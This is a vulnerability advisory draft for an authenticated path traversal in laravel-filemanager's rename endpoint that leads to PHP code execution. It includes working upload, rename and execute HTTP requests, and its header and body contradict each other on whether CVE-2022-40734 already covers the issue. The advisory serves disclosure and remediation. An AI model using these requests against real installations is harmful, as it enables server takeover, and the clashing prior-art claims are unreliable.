# laravel-filemanager Rename Path Traversal Remote Code Execution (v2.15.1)

> ⚠️ **COVERED / 勿提交**: 提报前查重发现在先披露——**CVE-2022-40734 (rename 换扩展名 — 同根因,2.6.4 修复)**。本目录仅作研究存档,不提交 VulDB。
**CWE-22 · Authenticated path traversal in rename · Arbitrary file move with attacker-controlled extension, leading to remote code execution on default configuration**

> **Vendor:** UniSharp (https://github.com/UniSharp)
> **Product:** laravel-filemanager (Laravel package, https://github.com/UniSharp/laravel-filemanager)
> **Affected version:** 2.15.1 (commit 28b491d, master as of 2026-09-28); within-root impact present in all versions
> **Affected endpoints:** GET /filemanager/rename (route `lfm.rename`, default middleware `['web','auth']`)
> **Disclosed via:** VulDB (submission #xxxxxx)
> **Note:** Validation used only a harmless md5 marker payload; no credentials were extracted, and no sensitive values appear in this disclosure.

## 1. Summary

The rename endpoint of laravel-filemanager accepts `working_dir`, `file` and `new_name` straight from the request and builds the destination path by raw concatenation, with no `..` filtering, `basename()` or `realpath()` anywhere in `src/`. The default configuration disables both `alphanumeric_filename` and `alphanumeric_directory` validation, and rename never re-applies the upload-side extension/mime checks. Any authenticated LFM user can therefore move an uploaded file into any directory inside the storage disk — including the web-served storage root — and choose an arbitrary extension, e.g. rename an uploaded `poc.pdf` to `../../poc.php`, which executes as PHP under the web root: authenticated remote code execution on a stock install.

Distinct from prior advisories: **CVE-2022-40734** (download-endpoint read traversal) and **CVE-2024-21546** (upload-endpoint trailing-dot extension bypass, fixed 2.9.1) do not cover the rename endpoint's arbitrary move; v2.15.1 still contains zero `..` sanitization in `src/`.

## 2. Root Cause

| File | Line | Role |
|---|---|---|
| `src/Controllers/RenameController.php` | 17-18 | `old_name`/`new_name` taken from raw request input |
| `src/Lfm.php` | 31-34 | `input()` returns raw request input, no sanitization |
| `src/Controllers/RenameController.php` | 39-58 | alphanumeric validation skipped (config defaults `false`) |
| `src/Controllers/RenameController.php` | 63 | existence check returns `false` for free traversal target |
| `src/LfmPath.php` | 71-91, 181-198 | `path('storage')`/`normalizeWorkingDir()` concatenate raw `working_dir` + `new_name`; no `..`/`basename()`/`realpath()` filtering anywhere in `src/` |
| `src/LfmStorageRepository.php` | 33 | sink: `$this->disk->move($this->path, $new_lfm_path->path('storage'))` |

## 3. Prerequisites

- Any authenticated LFM-enabled account (default middleware `['web','auth']`).
- Package defaults (config not published): `alphanumeric_filename=false`, `alphanumeric_directory=false`, `should_validate_mime=true`, blocklist `php`/`html`.
- Web-served storage root (`public/storage` symlink, default).
- Within-root arbitrary move (sufficient for RCE) works on every version incl. 2.15.1 on Flysystem v2/v3; writing outside the storage root additionally requires Flysystem v1 (Laravel 8 and earlier).

## 4. Reproduction

```http
POST /filemanager/upload?type=file HTTP/1.1
Host: target
Cookie: <any authenticated LFM user session>
Content-Type: multipart/form-data; boundary=----poc

------poc
Content-Disposition: form-data; name="upload"; filename="poc.pdf"
Content-Type: application/pdf

%PDF-1.4
<?php echo "LFM-01-TEST-".md5("poc"); ?>
%%EOF
------poc--
```

```http
GET /filemanager/rename?working_dir=/1&file=poc.pdf&new_name=../../poc.php HTTP/1.1
Host: target
Cookie: <any authenticated LFM user session>
```

→ HTTP 200 "OK"; `storage/app/public/files/1/poc.pdf` moved to `storage/app/public/poc.php`.

```http
GET /storage/poc.php HTTP/1.1
Host: target
```

→ `LFM-01-TEST-302fac1d6d73cf4fdf2c9919195df864` (= `md5("poc")`) — attacker-uploaded content executes as PHP under the web root.

Scripted PoC: `poc/exploit.sh` (payload builder: `poc/make-payload.sh`). Raw verification transcript: `evidence/LFM-01.txt`.

## 5. Confirmed Techniques

- Verified on laravel/framework 13.33.0 + league/flysystem 3.36.0 + PHP 8.4.26, package v2.15.1 (diff-identical to commit 28b491d), default config.
- Direct `.php` upload blocked; `%PDF-1.4`-wrapped marker passes as `application/pdf`.
- Rename with `new_name=../../poc.php` → moved to disk root with `.php` extension (HTTP 200, no re-validation); `GET /storage/poc.php` executes marker → authenticated RCE.
- Cross-user move `new_name=../2/planted-by-user1.php` → written into user 2's private folder.
- Cross-user listing `working_dir=/1/../2` (MultiUser middleware uses `Str::startsWith()` only).
- Root escape blocked on Flysystem v3 (`PathTraversalDetected`, HTTP 500) — requires Flysystem v1 (Laravel <=8 / older LFM versions without the v2.15.1 `flysystem >=2.0.0` floor).

## 6. Impact

Any authenticated LFM user can plant attacker-controlled content as an arbitrary `.php` file in the web-served storage root of a default installation → remote code execution (PR:L). Same primitive enables cross-user arbitrary file moves; outside-root writes on Flysystem v1 stacks. No credentials or sensitive data were extracted during validation.

## 7. CVSS 3.1

`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (Base 8.8 — High)

## 8. Remediation

1. Normalize path segments and reject any `..` component inside `LfmPath::normalizeWorkingDir()` and `LfmPath::setName()` before any storage operation.
2. Re-apply the upload extension/mime validation to `new_name` in `RenameController` before `move()`.
3. Fix `MultiUser`'s `working_dir` check (normalize before comparing instead of `Str::startsWith()`).

## 9. References

- Project: https://github.com/UniSharp/laravel-filemanager
- CWE-22: https://cwe.mitre.org/data/definitions/22.html
- Related but distinct — CVE-2022-40734: https://www.cve.org/CVERecord?id=CVE-2022-40734
- Related but distinct — CVE-2024-21546: https://www.cve.org/CVERecord?id=CVE-2024-21546
- External disclosure: https://gist.github.com/qianqiusujiu/95a849d259b0a1f9542888119faa845d
- VulDB submission #xxxxxx

---
*All validation was performed in a local, isolated environment. The temporary environment was destroyed after testing.*
